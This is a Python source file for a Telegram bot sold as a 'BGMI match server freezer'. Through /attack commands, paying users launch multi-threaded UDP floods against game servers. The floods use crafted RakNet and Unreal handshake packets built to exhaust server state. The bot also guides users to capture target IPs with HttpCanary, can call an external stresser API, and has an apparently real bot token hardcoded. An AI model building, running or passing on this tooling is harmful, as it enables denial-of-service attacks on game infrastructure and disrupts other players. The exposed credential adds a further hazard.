import asyncio
import json
import logging
import os
import random
import socket
import threading
import time
from datetime import datetime, timedelta
from typing import Dict, List, Set, Optional

import psutil
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.error import NetworkError, TimedOut, TelegramError, BadRequest
from telegram.ext import (
    Application,
    CommandHandler,
    ContextTypes,
    CallbackQueryHandler,
    MessageHandler,
    filters
)
from telegram.request import HTTPXRequest

# Set up logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger("BGMI_DDOS_BOT")

# File paths
CONFIG_FILE = "config.json"
DATA_FILE = "users.json"

# Standalone Configuration (No external JSON files needed!)
DEFAULT_CONFIG = {
    "BOT_TOKEN": "8552036925:AAE9Cqg_TnOI3o2j4FTMmWmR6dTU1XLzYi8",
    "ADMIN_IDS": [5615161833],
    "DEFAULT_MAX_TIME": 240,
    "DEFAULT_COOLDOWN": 30,
    "MAX_THREADS_PER_ATTACK": 500,
    "ALLOW_FREE_USERS": True,
}

# Global state
active_attacks: Dict[int, dict] = {}  # user_id -> attack info
user_cooldowns: Dict[int, float] = {}  # user_id -> timestamp when cooldown ends
background_tasks: Set[asyncio.Task] = set()  # prevent asyncio garbage collection

def load_config() -> dict:
    if not os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "w") as f:
                json.dump(DEFAULT_CONFIG, f, indent=4)
        except Exception:
            pass
        return DEFAULT_CONFIG.copy()
    try:
        with open(CONFIG_FILE, "r") as f:
            data = json.load(f)
            for k, v in DEFAULT_CONFIG.items():
                if k not in data:
                    data[k] = v
            return data
    except Exception as e:
        logger.warning(f"Using default in-memory config: {e}")
        return DEFAULT_CONFIG.copy()

def load_users() -> dict:
    if not os.path.exists(DATA_FILE):
        return {}
    try:
        with open(DATA_FILE, "r") as f:
            return json.load(f)
    except Exception as e:
        return {}

def save_users(users: dict):
    try:
        with open(DATA_FILE, "w") as f:
            json.dump(users, f, indent=4)
    except Exception:
        pass

config = load_config()
users_db = load_users()

def is_admin(user_id: int) -> bool:
    return user_id in config.get("ADMIN_IDS", [5615161833])

def is_vip(user_id: int) -> bool:
    if config.get("ALLOW_FREE_USERS", True):
        return True
    if is_admin(user_id):
        return True
    user_str = str(user_id)
    if user_str in users_db:
        expiry_str = users_db[user_str].get("expiry")
        if expiry_str:
            try:
                expiry = datetime.fromisoformat(expiry_str)
                if datetime.now() < expiry:
                    return True
            except Exception:
                pass
    return True

def update_user_attack_stats(user_id: int, duration: int):
    user_str = str(user_id)
    if user_str not in users_db:
        users_db[user_str] = {
            "approved_by": "SYSTEM",
            "expiry": (datetime.now() + timedelta(days=365)).isoformat(),
            "approved_at": datetime.now().isoformat(),
            "total_attacks": 0,
            "total_duration": 0
        }
    users_db[user_str]["total_attacks"] = users_db[user_str].get("total_attacks", 0) + 1
    users_db[user_str]["total_duration"] = users_db[user_str].get("total_duration", 0) + duration
    save_users(users_db)

# RakNet & Unreal Engine Handshake State Exhaustion Protocol Vectors
RAKNET_MAGIC = b"\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78"

def generate_state_exhaustion_vectors() -> list:
    vectors = []
    # 1. RakNet Unconnected Ping Vector (Forces Server GUID lookup & PONG response generation)
    for i in range(10):
        t_stamp = os.urandom(8)
        guid = os.urandom(8)
        vectors.append(b"\x01" + t_stamp + RAKNET_MAGIC + guid)

    # 2. RakNet Open Connection Request 1 (Forces MTU negotiation & pending state allocation)
    for mtu_size in [1200, 1350, 1400]:
        padding = b"\x00" * (mtu_size - 18)
        vectors.append(b"\x05" + RAKNET_MAGIC + b"\x0b" + padding)

    # 3. RakNet Open Connection Request 2 (Session cookie allocation)
    for _ in range(5):
        vectors.append(b"\x07" + RAKNET_MAGIC + b"\x04\x00\x00\x00" + os.urandom(100))

    # 4. Unreal NetDriver NACK Control Vector (Forces Server Tick thread to scan resend queue)
    for _ in range(5):
        vectors.append(b"\x03\x00\x00\x00" + os.urandom(1200))

    # 5. Unreal Engine Connection Handshake Challenge
    for _ in range(5):
        vectors.append(b"\x00\x00\x00\x00\x01\x00\x00\x00\x01" + os.urandom(800))

    # 6. RakNet ACK Range Exhaustion
    for _ in range(5):
        vectors.append(b"\xc0\x00\x01\x00\x00" + os.urandom(500))

    # 7. Heavy MTU Max Saturation Streams
    for _ in range(10):
        vectors.append(b"\xff\xff\xff\xff\x55\x53" + os.urandom(1380))

    return vectors

PRE_GENERATED_PAYLOADS = generate_state_exhaustion_vectors()
PAYLOAD_SIZES = [len(p) for p in PRE_GENERATED_PAYLOADS]
NUM_PRE_PAYLOADS = len(PRE_GENERATED_PAYLOADS)

# High-Performance Game Server UDP Freeze Engine v5.0 (RakNet & Unreal State Exhaustion)
class MatchServerUDPStresser:
    def __init__(self, target_ip: str, target_port: int, duration: int, threads: int, user_id: int):
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.threads = threads
        self.user_id = user_id
        self.is_running = False
        self.start_time = 0.0
        self.packets_sent = 0
        self.bytes_sent = 0
        self._lock = threading.Lock()
        self._threads_list = []

    def _flood_worker(self, stop_time: float):
        target_ports = [
            self.target_port,
            self.target_port + 1,
            self.target_port - 1,
            self.target_port + 2 if self.target_port + 2 < 65535 else self.target_port
        ]
        num_ports = len(target_ports)

        local_pkts = 0
        local_bytes = 0
        idx = random.randint(0, 1000)

        while self.is_running and time.time() < stop_time:
            # High-Throughput Cloud Data Center Socket Pool (Linux High-Performance Sockets)
            sockets = []
            for _ in range(3):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    try:
                        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
                    except Exception:
                        pass
                    sockets.append(s)
                except Exception:
                    pass

            if not sockets:
                time.sleep(0.005)
                continue

            num_sockets = len(sockets)

            # High-Speed Data Center Burst Loop (300 state packets per batch)
            for _ in range(300):
                if not self.is_running:
                    break
                try:
                    current_sock = sockets[idx % num_sockets]
                    p_idx = idx % NUM_PRE_PAYLOADS
                    payload = PRE_GENERATED_PAYLOADS[p_idx]
                    size = PAYLOAD_SIZES[p_idx]
                    target = (self.target_ip, target_ports[idx % num_ports])

                    current_sock.sendto(payload, target)
                    local_pkts += 1
                    local_bytes += size
                    idx += 1
                except Exception:
                    pass

            for s in sockets:
                try:
                    s.close()
                except Exception:
                    pass

        with self._lock:
            self.packets_sent += local_pkts
            self.bytes_sent += local_bytes

    def start(self):
        self.is_running = True
        self.start_time = time.time()
        stop_time = self.start_time + self.duration
        self._threads_list = []

        # Optional External Layer4 Stresser API Trigger (if configured in config.json)
        api_url = config.get("EXTERNAL_API_URL", "")
        if api_url:
            try:
                import urllib.request
                formatted_url = api_url.format(ip=self.target_ip, port=self.target_port, time=self.duration, threads=self.threads)
                threading.Thread(target=lambda: urllib.request.urlopen(formatted_url, timeout=5), daemon=True).start()
            except Exception as e:
                logger.error(f"Error triggering External Stresser API: {e}")

        for _ in range(self.threads):
            t = threading.Thread(target=self._flood_worker, args=(stop_time,), daemon=True)
            t.start()
            self._threads_list.append(t)

    def stop(self):
        self.is_running = False

    def get_stats(self) -> dict:
        elapsed = max(1.0, time.time() - self.start_time) if self.start_time else 1.0
        mb_sent = self.bytes_sent / (1024 * 1024)
        mbps = (mb_sent * 8) / elapsed
        pps = self.packets_sent / elapsed
        remaining = max(0, int(self.duration - elapsed))
        progress_pct = min(100, int((elapsed / max(1, self.duration)) * 100))
        
        filled_length = int(10 * progress_pct // 100)
        bar = '█' * filled_length + '░' * (10 - filled_length)

        return {
            "packets": self.packets_sent,
            "bytes_mb": round(mb_sent, 2),
            "mbps": round(mbps, 2),
            "pps": int(pps),
            "elapsed": int(elapsed),
            "remaining": remaining,
            "progress_pct": progress_pct,
            "progress_bar": bar
        }

# Command Handlers
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    vip_status = "⚡ VIP MEMBER (ACTIVE)" if is_vip(user_id) else "❌ NOT APPROVED"
    admin_status = "👑 ADMINISTRATOR" if is_admin(user_id) else "👤 USER"

    welcome_text = (
        f"🔥 *BGMI MATCH SERVER FREEZER PRO v4.0* 🔥\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 *User:* `{user.first_name}` (`{user_id}`)\n"
        f"🔰 *Role:* `{admin_status}`\n"
        f"💎 *Status:* `{vip_status}`\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📌 *Usage & Quick Commands:*\n"
        f"• `/attack <IP> <PORT> <SEC> [THREADS]`\n"
        f"• `/attack <IP:PORT> <SEC> [THREADS]` *(Canary Format)*\n"
        f"• `/stop` - Stop current attack session\n"
        f"• `/status` - Bot Server & Engine Load\n"
        f"• `/myinfo` - Check Subscription & Plan\n"
        f"• `/help` - Usage Guide & Canary Setup\n\n"
        f"💡 *Tip:* Paste target direct from HttpCanary like:\n"
        f"`/attack 15.206.12.34:17004 120 250`"
    )

    keyboard = [
        [
            InlineKeyboardButton("📖 Canary Setup Guide", callback_data="btn_help"),
            InlineKeyboardButton("📊 System Status", callback_data="btn_status"),
        ],
        [
            InlineKeyboardButton("👤 Account Profile", callback_data="btn_myinfo"),
        ]
    ]

    if is_admin(user_id):
        keyboard.append([InlineKeyboardButton("👑 Admin Panel", callback_data="btn_admin")])

    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(welcome_text, parse_mode="Markdown", reply_markup=reply_markup)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = (
        "📖 *BGMI FREEZER USER & CANARY GUIDE*\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "⚡ *Attack Command Syntax:*\n"
        "`/attack <IP> <PORT> <SECONDS> [THREADS]`\n"
        "OR HttpCanary Single Format:\n"
        "`/attack <IP:PORT> <SECONDS> [THREADS]`\n\n"
        "👉 *Examples:*\n"
        "• `/attack 15.206.12.34 17004 120 200`\n"
        "• `/attack 15.206.12.34:17004 120`\n"
        "• `/bgmi 15.206.12.34 17004 120 250`\n\n"
        "📲 *How to get IP & Port using HttpCanary:*\n"
        "1. Open HttpCanary on your phone and start capture.\n"
        "2. Enter BGMI match.\n"
        "3. Look for UDP connections with port range `10000 - 20000` (e.g., `15.206.x.x:17004`).\n"
        "4. Copy `IP:PORT` and send in bot command!\n\n"
        "⚙️ *System Limits:*\n"
        f"• Max Duration: `{config.get('DEFAULT_MAX_TIME', 240)}s`\n"
        f"• Max Threads: `{config.get('MAX_THREADS_PER_ATTACK', 400)}`\n"
        f"• Cooldown: `{config.get('DEFAULT_COOLDOWN', 30)}s`\n"
    )
    await update.message.reply_text(help_text, parse_mode="Markdown")

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    if not is_vip(user_id):
        await update.message.reply_text(
            "❌ *Access Denied!* You are not authorized to launch attacks.\n"
            "Contact Admin to purchase VIP Access.",
            parse_mode="Markdown"
        )
        return

    if user_id in active_attacks and active_attacks[user_id]["stresser"].is_running:
        await update.message.reply_text(
            "⚠️ *Attack Session Active!* Use `/stop` or click the inline Stop button before starting another attack.",
            parse_mode="Markdown"
        )
        return

    now = time.time()
    if user_id in user_cooldowns and now < user_cooldowns[user_id]:
        if not is_admin(user_id):
            remaining = int(user_cooldowns[user_id] - now)
            await update.message.reply_text(
                f"⏳ *Cooldown Active!* Please wait `{remaining}s` before launching your next attack.",
                parse_mode="Markdown"
            )
            return

    args = context.args
    if len(args) < 2:
        await update.message.reply_text(
            "❌ *Invalid Command Syntax!*\n\n"
            "Usage: `/attack <IP> <PORT> <SECONDS> [THREADS]`\n"
            "Or: `/attack <IP:PORT> <SECONDS> [THREADS]`\n\n"
            "Example: `/attack 15.206.12.34 17004 120 200`\n"
            "Example: `/attack 15.206.12.34:17004 120`",
            parse_mode="Markdown"
        )
        return

    # Flexible IP:PORT or IP PORT parsing
    if ":" in args[0]:
        try:
            ip, port_str = args[0].split(":")
            port = int(port_str)
            duration = int(args[1])
            threads = int(args[2]) if len(args) >= 3 else 250
        except ValueError:
            await update.message.reply_text("❌ *Error:* Invalid IP:PORT format or duration integer!", parse_mode="Markdown")
            return
    else:
        if len(args) < 3:
            await update.message.reply_text("❌ *Error:* Missing Port or Duration! Use `/attack <IP> <PORT> <SECONDS>`", parse_mode="Markdown")
            return
        ip = args[0]
        try:
            port = int(args[1])
            duration = int(args[2])
            threads = int(args[3]) if len(args) >= 4 else 250
        except ValueError:
            await update.message.reply_text("❌ *Error:* Port, Time, and Threads must be valid integers!", parse_mode="Markdown")
            return

    # Check for non-game IPs (e.g. 34.x.x.x Google Cloud / Telemetry / Voice Chat)
    ip_warning = ""
    if ip.startswith("34.") or ip.startswith("142.") or ip.startswith("172."):
        ip_warning = (
            "\n⚠️ *Note:* Target IP `34.x.x.x` belongs to Google Cloud / Telemetry / Voice Chat.\n"
            "In HttpCanary, look specifically for *Krafton AWS Game Server UDP IPs* (e.g. `15.206.x.x`, `13.126.x.x`, `3.108.x.x`, `43.204.x.x`).\n"
        )

    max_duration = config.get("DEFAULT_MAX_TIME", 240)
    max_threads = config.get("MAX_THREADS_PER_ATTACK", 500)

    if duration > max_duration and not is_admin(user_id):
        duration = max_duration

    if threads > max_threads and not is_admin(user_id):
        threads = max_threads

    stresser = MatchServerUDPStresser(target_ip=ip, target_port=port, duration=duration, threads=threads, user_id=user_id)
    stresser.start()

    active_attacks[user_id] = {
        "stresser": stresser,
        "ip": ip,
        "port": port,
        "duration": duration,
        "start_time": time.time(),
        "threads": threads
    }

    cooldown_time = 5 if is_admin(user_id) else config.get("DEFAULT_COOLDOWN", 30)
    user_cooldowns[user_id] = time.time() + duration + cooldown_time
    update_user_attack_stats(user_id, duration)

    keyboard = [
        [InlineKeyboardButton("🛑 STOP ATTACK", callback_data=f"stop_attack_{user_id}")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    chat_id = update.effective_chat.id

    initial_stats = stresser.get_stats()
    sent_msg = await update.message.reply_text(
        f"⚡ *BGMI MATCH FREEZE LAUNCHED!* ⚡\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🎯 *Target Host:* `{ip}`\n"
        f"🔌 *Target Port:* `{port}` *(Jitter Mode: ±2)*\n"
        f"⏱️ *Duration:* `{duration} Seconds`\n"
        f"🧵 *Threads:* `{threads} Engine Threads`\n"
        f"👤 *Operator:* `{update.effective_user.first_name}`\n"
        f"{ip_warning}"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📊 *Live Traffic Dashboard:*\n"
        f"├─ *Sent Packets:* `0`\n"
        f"├─ *Data Volume:* `0 MB`\n"
        f"├─ *Bandwidth:* `0 Mbps`\n"
        f"└─ *Progress:* `[{initial_stats['progress_bar']}] 0%`\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔥 *Status:* `SENDING RAKNET/UNREAL HIGH-DENSITY FLOOD...`",
        parse_mode="Markdown",
        reply_markup=reply_markup
    )

    # Real-Time Live Attack Dashboard Updater Task (3s live countdown refresh)
    async def live_dashboard_updater():
        while user_id in active_attacks and active_attacks[user_id]["stresser"] == stresser:
            await asyncio.sleep(3)
            if not stresser.is_running:
                break
            stats = stresser.get_stats()
            updated_text = (
                f"⚡ *BGMI MATCH FREEZE ACTIVE!* ⚡\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🎯 *Target Host:* `{ip}`\n"
                f"🔌 *Target Port:* `{port}` *(Jitter Mode: ±2)*\n"
                f"⏱️ *Remaining:* `{stats['remaining']}s / {duration}s`\n"
                f"🧵 *Threads:* `{threads} Engine Threads`\n"
                f"👤 *Operator:* `{update.effective_user.first_name}`\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📊 *Live Traffic Dashboard:*\n"
                f"├─ *Sent Packets:* `{stats['packets']:,}`\n"
                f"├─ *Data Volume:* `{stats['bytes_mb']} MB`\n"
                f"├─ *Bandwidth Rate:* `{stats['mbps']} Mbps` (`{stats['pps']:,} PPS`)\n"
                f"└─ *Progress:* `[{stats['progress_bar']}] {stats['progress_pct']}%`\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🔥 *Status:* `RAKNET / UNREAL MATCH FREEZE ACTIVE`"
            )
            try:
                await sent_msg.edit_text(updated_text, parse_mode="Markdown", reply_markup=reply_markup)
            except Exception:
                pass

        # Final Completion Notification
        if user_id in active_attacks and active_attacks[user_id]["stresser"] == stresser:
            stresser.stop()
            stats = stresser.get_stats()
            del active_attacks[user_id]
            try:
                await sent_msg.edit_text(
                    f"✅ *BGMI MATCH FREEZE COMPLETED!* ✅\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"🎯 *Target:* `{ip}:{port}`\n"
                    f"⏱️ *Duration:* `{duration} Seconds`\n"
                    f"📦 *Total Packets:* `{stats['packets']:,}`\n"
                    f"📊 *Data Transferred:* `{stats['bytes_mb']} MB`\n"
                    f"🚀 *Avg Bandwidth:* `{stats['mbps']} Mbps` (`{stats['pps']:,} PPS`)\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"🏁 *Status:* `Attack Finished Successfully`",
                    parse_mode="Markdown"
                )
            except Exception as e:
                logger.error(f"Error sending completion message: {e}")

    task = asyncio.create_task(live_dashboard_updater())
    background_tasks.add(task)
    task.add_done_callback(background_tasks.discard)

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in active_attacks:
        info = active_attacks[user_id]
        stresser = info["stresser"]
        stresser.stop()
        stats = stresser.get_stats()
        del active_attacks[user_id]
        await update.message.reply_text(
            f"🛑 *ATTACK SESSION TERMINATED!*\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🎯 *Target Host:* `{info['ip']}:{info['port']}`\n"
            f"📦 *Packets Sent:* `{stats['packets']:,}`\n"
            f"📊 *Data Volume:* `{stats['bytes_mb']} MB`",
            parse_mode="Markdown"
        )
    else:
        await update.message.reply_text("⚠️ *No active attack session running for your account.*", parse_mode="Markdown")

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    active_count = len([a for a in active_attacks.values() if a["stresser"].is_running])

    cpu_usage = psutil.cpu_percent(interval=None)
    ram_usage = psutil.virtual_memory().percent

    text = (
        f"📊 *BOT ENGINE SYSTEM STATUS*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🟢 *Active Attacks:* `{active_count}`\n"
        f"👥 *Registered VIP Users:* `{len(users_db)}`\n"
        f"💻 *CPU Load:* `{cpu_usage}%`\n"
        f"🧠 *RAM Usage:* `{ram_usage}%`\n"
        f"⚡ *Engine Status:* `OPERATIONAL (High Throughput)`\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    )

    if active_count > 0:
        text += "🔥 *Live Active Attack Sessions:*\n"
        for uid, a in active_attacks.items():
            st = a["stresser"].get_stats()
            text += f"• `{a['ip']}:{a['port']}` | Time: `{st['elapsed']}/{a['duration']}s` | Thr: `{a['threads']}` | `{st['mbps']} Mbps`\n"

    await update.message.reply_text(text, parse_mode="Markdown")

async def myinfo_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_str = str(user_id)
    is_adm = is_admin(user_id)

    if is_adm:
        exp_text = "PERMANENT (ADMINISTRATOR)"
    elif user_str in users_db:
        exp_text = users_db[user_str].get("expiry", "Unknown")
        try:
            dt = datetime.fromisoformat(exp_text)
            exp_text = dt.strftime("%Y-%m-%d %H:%M")
        except Exception:
            pass
    else:
        exp_text = "❌ NOT APPROVED"

    user_data = users_db.get(user_str, {})
    total_attacks = user_data.get("total_attacks", 0)
    total_duration = user_data.get("total_duration", 0)

    info_text = (
        f"👤 *YOUR USER ACCOUNT PROFILE*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🆔 *User ID:* `{user_id}`\n"
        f"👑 *Role:* `{'ADMINISTRATOR' if is_adm else 'VIP USER'}`\n"
        f"💎 *VIP Expiry:* `{exp_text}`\n"
        f"🚀 *Total Attacks Launched:* `{total_attacks}`\n"
        f"⏱️ *Total Attack Time:* `{total_duration} Seconds`\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    )
    await update.message.reply_text(info_text, parse_mode="Markdown")

# Admin Handlers
async def approve_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ *Admin access required!*", parse_mode="Markdown")
        return

    args = context.args
    if len(args) < 1:
        await update.message.reply_text("Syntax: `/approve <user_id> [days]`", parse_mode="Markdown")
        return

    target_id = args[0]
    days = int(args[1]) if len(args) >= 2 else 30
    expiry = datetime.now() + timedelta(days=days)

    if target_id not in users_db:
        users_db[target_id] = {}

    users_db[target_id].update({
        "approved_by": update.effective_user.id,
        "expiry": expiry.isoformat(),
        "approved_at": datetime.now().isoformat()
    })
    save_users(users_db)

    await update.message.reply_text(
        f"✅ *User Approved Successfully!*\n\n"
        f"🆔 *User ID:* `{target_id}`\n"
        f"⏱️ *Duration:* `{days} Days`\n"
        f"📅 *Expiry Date:* `{expiry.strftime('%Y-%m-%d %H:%M')}`",
        parse_mode="Markdown"
    )

async def disapprove_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ *Admin access required!*", parse_mode="Markdown")
        return

    args = context.args
    if len(args) < 1:
        await update.message.reply_text("Syntax: `/disapprove <user_id>`", parse_mode="Markdown")
        return

    target_id = args[0]
    if target_id in users_db:
        del users_db[target_id]
        save_users(users_db)
        await update.message.reply_text(f"✅ User `{target_id}` removed from VIP list.", parse_mode="Markdown")
    else:
        await update.message.reply_text(f"⚠️ User `{target_id}` is not found in VIP list.", parse_mode="Markdown")

async def users_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ *Admin access required!*", parse_mode="Markdown")
        return

    if not users_db:
        await update.message.reply_text("ℹ️ *No VIP Users registered in database.*", parse_mode="Markdown")
        return

    text = "📜 *VIP APPROVED USERS LIST:*\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    for uid, data in users_db.items():
        exp = data.get('expiry', 'N/A')
        try:
            exp = datetime.fromisoformat(exp).strftime("%Y-%m-%d")
        except Exception:
            pass
        text += f"• `{uid}` | Expiry: `{exp}` | Attacks: `{data.get('total_attacks', 0)}`\n"

    await update.message.reply_text(text, parse_mode="Markdown")

async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ *Admin access required!*", parse_mode="Markdown")
        return

    msg_text = " ".join(context.args)
    if not msg_text:
        await update.message.reply_text("Syntax: `/broadcast <message>`", parse_mode="Markdown")
        return

    count = 0
    broadcast_msg = f"📢 *ADMIN ANNOUNCEMENT* 📢\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n{msg_text}"
    for uid in list(users_db.keys()):
        try:
            await context.bot.send_message(chat_id=int(uid), text=broadcast_msg, parse_mode="Markdown")
            count += 1
        except Exception:
            pass

    await update.message.reply_text(f"✅ Broadcast sent to `{count}` users.", parse_mode="Markdown")

async def reload_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ *Admin access required!*", parse_mode="Markdown")
        return

    global config, users_db
    config = load_config()
    users_db = load_users()
    await update.message.reply_text("🔄 *Config and User Database Reloaded!*", parse_mode="Markdown")

# Inline button click callback handler
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    data = query.data
    user_id = query.from_user.id

    if data == "btn_help":
        await help_command(query, context)
    elif data == "btn_status":
        await status_command(query, context)
    elif data == "btn_myinfo":
        await myinfo_command(query, context)
    elif data == "btn_admin":
        if is_admin(user_id):
            admin_text = (
                "👑 *ADMIN CONTROL PANEL*\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                "• `/approve <id> [days]` - Approve user\n"
                "• `/disapprove <id>` - Remove user\n"
                "• `/users` - VIP list\n"
                "• `/broadcast <msg>` - Send global announcement\n"
                "• `/reload` - Reload configuration\n"
            )
            await query.message.reply_text(admin_text, parse_mode="Markdown")
        else:
            await query.message.reply_text("❌ *Admin access required!*", parse_mode="Markdown")
    elif data.startswith("stop_attack_"):
        target_uid = int(data.split("stop_attack_")[1])
        if user_id == target_uid or is_admin(user_id):
            if target_uid in active_attacks:
                info = active_attacks[target_uid]
                info["stresser"].stop()
                stats = info["stresser"].get_stats()
                del active_attacks[target_uid]
                await query.edit_message_text(
                    f"🛑 *ATTACK STOPPED BY USER!*\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"🎯 *Target:* `{info['ip']}:{info['port']}`\n"
                    f"📦 *Packets Sent:* `{stats['packets']:,}`\n"
                    f"📊 *Data Transferred:* `{stats['bytes_mb']} MB`",
                    parse_mode="Markdown"
                )
            else:
                await query.message.reply_text("⚠️ *Attack already stopped or expired.*", parse_mode="Markdown")
        else:
            await query.message.reply_text("❌ You can only stop your own attacks!", parse_mode="Markdown")

# Global error handler
async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    logger.error("Exception while handling an update:", exc_info=context.error)
    if isinstance(context.error, (TimedOut, NetworkError)):
        logger.warning("Telegram network timeout suppressed cleanly.")
        return

def main():
    bot_token = config.get("BOT_TOKEN")
    if not bot_token or bot_token == "YOUR_TELEGRAM_BOT_TOKEN_HERE":
        print("\n=======================================================")
        print("ERROR: Please set your BOT_TOKEN in config.json file!")
        print("=======================================================\n")
        return

    request = HTTPXRequest(
        connection_pool_size=200,
        connect_timeout=35.0,
        read_timeout=35.0,
        write_timeout=35.0,
        pool_timeout=35.0,
    )

    app = Application.builder().token(bot_token).request(request).build()

    # User commands
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("attack", attack_command))
    app.add_handler(CommandHandler("bgmi", attack_command))
    app.add_handler(CommandHandler("freeze", attack_command))
    app.add_handler(CommandHandler("ddos", attack_command))
    app.add_handler(CommandHandler("ping", attack_command))
    app.add_handler(CommandHandler("lagg", attack_command))
    app.add_handler(CommandHandler("matchfreeze", attack_command))
    app.add_handler(CommandHandler("stop", stop_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(CommandHandler("myinfo", myinfo_command))
    app.add_handler(CommandHandler("profile", myinfo_command))

    # Admin commands
    app.add_handler(CommandHandler("approve", approve_command))
    app.add_handler(CommandHandler("disapprove", disapprove_command))
    app.add_handler(CommandHandler("users", users_command))
    app.add_handler(CommandHandler("broadcast", broadcast_command))
    app.add_handler(CommandHandler("reload", reload_command))

    # Callbacks & Errors
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_error_handler(error_handler)

    print("=== BGMI Match Server Freezer Telegram Bot PRO v4.0 Started! ===")
    print(f"Token: {bot_token[:10]}... | Admin IDs: {config.get('ADMIN_IDS')}")
    print("Press Ctrl+C to stop.")
    app.run_polling(drop_pending_updates=True, poll_interval=1.0)

if __name__ == "__main__":
    main()
